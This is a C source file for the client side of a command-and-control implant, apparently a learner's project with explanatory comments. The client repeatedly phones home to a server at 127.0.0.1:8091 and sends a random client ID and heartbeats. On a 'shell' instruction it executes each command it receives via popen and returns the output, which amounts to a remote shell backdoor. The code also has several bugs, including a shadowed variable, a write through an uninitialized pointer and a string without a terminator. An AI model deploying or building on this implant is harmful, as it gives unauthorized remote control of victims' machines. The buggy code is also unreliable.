#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <time.h>

//declaring functions
char* run_command(char* command);
int send_response(int sock, char *response);
char * phone_home();
char * client_id_generate();

int main() {
    char * ph_value;

    int first_connection = 0;

    //client id

    char * client_id = client_id_generate();

    while (1) {
        // phoning home
        printf("\nPhoning home\n");
        ph_value = phone_home(first_connection, client_id);

        int first_connection = 1;

        //printf("ph_value = %s", ph_value);

        // if server says wait, return continue & wait for X time
        if ( strcmp(ph_value, "continue" ) == 0 ) {
            printf("SLEEPING IN MAIN\n");
            sleep(15);
            //for some reason it sleeps first, then prints?
        }

        /*
        else if (ph_value == "err") {
            printf("ERR: %s", ph_value);
            return -1;
        }*/

        // catchall for if nothing matches, it assumes this is an error & exits
        // Err statemnts/more specifics come from return functions in phone_home
        else {
            printf("ERR: %s\n", ph_value);
            return -1;
        }
        
    }
    
    return 1;

}

char * phone_home(int first_connection, char * client_id) {
    int sock = 0, valread;
    struct sockaddr_in serv_addr; //contains server address & port
    char *hello = "Hello from client"; //setting & creating pointer for hello variable
    char buffer[1024] = {0}; //buffer for message length
    
    printf("Process ID: %d\n", getpid());

    // create a socket file descriptor

    //AF_INET = ipv4, and SOCK_STREAM means tcp. I think the < is, if it returns greater than 0, exit, as the socket() function returned a 1 (aka fail)
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) { 
        printf("\n Socket creation error \n");
        return "err";
    }

    // set server address and port, IF there is no failure to connect

    //here's that structure again, it's very similar to accessing a variable to another function in python (functionname.variable)
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8091);
       
    // convert IPv4 and IPv6 addresses from text to binary form
    if(inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr)<=0) { //does some conversion, not 100% the logic behind it
        printf("\nInvalid address/ Address not supported \n");
        return "err";
        //return -1;
    }
    
    // connect to server (on a 5 second loop)
    //again if the connect function returns a 1 (aka fail) then break and error 

    // connect(sockconnect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)et file descriptor, pointer to server address & port, size of struct socketaddr)

    //impleemnt retry later
    //while (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
        //printf("\nConnection Failed \n");
        //sleep(5);
    //}

    connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr));
    
    // send message to server
    //send(sock file, message, length of message, 0 = no special flags)

    //send(sock, hello, strlen(hello), 0);
    //printf("Hello message sent\n");
    //send_response(sock, hello);
    
    //// initial Contact
    printf("%i\n", first_connection);
    if ( first_connection == 0 ) {
        send_response(sock, client_id);
        return "continue";
    }

    else {
        // heartbeat, aka re connecting to server
        send_response(sock, "heartbeat");

        printf("Sending heartbeat");
        valread = read(sock, buffer, 1024);

        printf("BUFFER: %s\n", buffer);
    }

    ///// Decision tree

    if ( buffer == NULL ) {
        printf("Server Connected, but no instructions");
    }

    else if ( strcmp(buffer, "wait" ) == 0 ) {
        printf("SERVER SAYS: WAIT\n");
        close(sock);
        return "continue";
    }


    else if ( strcmp(buffer, "shell" ) == 0 ) {
        printf("SERVER SAYS: SHELL");
        while (valread) {
            printf("DEBUG: waiting on server input ==============\n");

            memset(buffer, 0, sizeof(buffer));

            valread = read(sock, buffer, 1024);
            printf("DEBUG: Command Recieved: %s\n", buffer);
            
            send_response(sock, run_command(buffer));

            //clearning buffer
            //buffer == NULL;

            //debug set value send response
            //send_response(sock, "test_response");

            //char * balls = "balls";
            //run_command(balls);
        }
    }

    else {
        char * return_val;
        sprintf(return_val, "Server Connected, instruction '%s' unknown, or not valid\n", buffer);
        return return_val;
    }

    // closing sock 
    //close(sock);

    //return 0;
}


//this takes the socket file, and the response to send back to the server. 
int send_response(int sock, char *response) {
    printf("Sending '%s'\n", response);

    if (send(sock, response, strlen(response),0 ) < 0) {
        perror("sending error");
    }
    
    //send(sock, response, strlen(response),0);
    printf("DEBUG: Response sent successfully==========\n\n");
    return 0;
}


char* run_command(char* command) {
    FILE* pipe = popen(command, "r");
    if (!pipe) {
        perror("popen failed");
        return NULL;
    }

    //allocating memory based on size of char
    char* buffer = malloc(sizeof(char) * 1024);
    // if not(hing in) buffer, error out. This means memort allocation failed
    if (!buffer) {
        //error for pipe/process
        perror("malloc failed");
        // close pipe/process
        pclose(pipe);
        return NULL;
    }

    //clearing any previous memory:
    //if (buffer != NULL ) {
    //    free(buffer);
    //}

    // in english, this loads in the shell output, and makes sure it doesn't go higher than 1024 (bytes_read math variable)
    size_t bytes_read = 0;
    while (fgets(buffer + bytes_read, 1024 - bytes_read, pipe)) {
        bytes_read += strlen(buffer + bytes_read);
        // || means or, basically, if bytes read is 1023, or the buffer is 1023 & ends in \n, break
        // it breaks so the buffer does not overflow, then moves to the next bit of code to allocate 1024 more bytes. 
        if (bytes_read == 1024 - 1 || buffer[bytes_read - 1] == '\n') {
            printf("DEBUG: break\n");
            break;
        }
        // taking bytes read, and adding 1024 bytes of memory for more text to be loaded
        buffer = realloc(buffer, sizeof(char) * (bytes_read + 1024));
        if (!buffer) {
            perror("realloc failed");
            pclose(pipe);
            return NULL;
        }
    }

    pclose(pipe);
    printf("Buffer: %s\n", buffer);
    return buffer;
}

char * client_id_generate() {
    // seed the random number generator with the current time
    srand(time(NULL));


    // adding a spot in memory for this variable, as it will vanish otherwise (on return) if not allocated
    char* random_string = malloc(sizeof(char) * 6);

    for (int i = 0; i < 5; i++) {
        int random_number = rand() % 26;
        random_string[i] = 'A' + random_number;
    }
    //random_string[5] = '\0';
    
    // print the random string
    printf("Random string: %s\n", random_string[6]);
    
    return random_string;

}